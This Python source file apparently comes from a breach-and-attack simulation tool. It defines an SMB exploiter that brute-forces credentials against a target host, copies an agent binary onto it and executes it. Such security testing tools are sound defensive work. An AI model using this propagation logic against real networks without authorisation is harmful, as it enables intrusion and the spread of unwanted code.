import logging
from typing import Sequence

from common.types import Event
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import (
    IRemoteAccessClient,
    IRemoteAccessClientBuilder,
    RemoteAuthenticationError,
    generate_brute_force_credentials,
)
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository
from infection_monkey.utils.threading import interruptible_iter

from .smb_options import SMBOptions

logger = logging.getLogger(__name__)


class SMBExploiter:
    def __init__(
        self,
        exploit_client_builder: IRemoteAccessClientBuilder,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        agent_binary_repository: IAgentBinaryRepository,
    ):
        self._exploit_client_builder = exploit_client_builder
        self._propagation_credentials_repository = propagation_credentials_repository
        self._agent_binary_repository = agent_binary_repository

    def exploit_host(
        self,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: SMBOptions,
        interrupt: Event,
    ) -> ExploiterResultData:
        if interrupt.is_set():
            return ExploiterResultData()

        exploit_client = self._exploit_client_builder.build_client(
            host=host, servers=servers, current_depth=current_depth, options=options
        )

        try:
            self._exploit(exploit_client, interrupt)
        except Exception as err:
            logger.exception(f"Failed to exploit {host}: {err}")
            return ExploiterResultData()

        try:
            self._propagate(exploit_client, host, interrupt)
            return ExploiterResultData(exploitation_success=True, propagation_success=True)
        except Exception as err:
            logger.exception(f"Failed to propagate to {host}: {err}")
            return ExploiterResultData(exploitation_success=True)

    def _exploit(self, exploit_client: IRemoteAccessClient, interrupt: Event):
        credentials = self._propagation_credentials_repository.get_credentials()
        credential_combinations = generate_brute_force_credentials(credentials)

        for brute_force_credentials in interruptible_iter(credential_combinations, interrupt):
            try:
                exploit_client.login(brute_force_credentials)
                return
            except RemoteAuthenticationError:
                continue

        raise Exception("Failed to login with the given credentials")

    def _propagate(
        self,
        exploit_client: IRemoteAccessClient,
        host: TargetHost,
        interrupt: Event,
    ):
        agent_binary = self._agent_binary_repository.get_agent_binary(host.operating_system)
        exploit_client.copy_file(agent_binary)
        exploit_client.execute(interrupt)
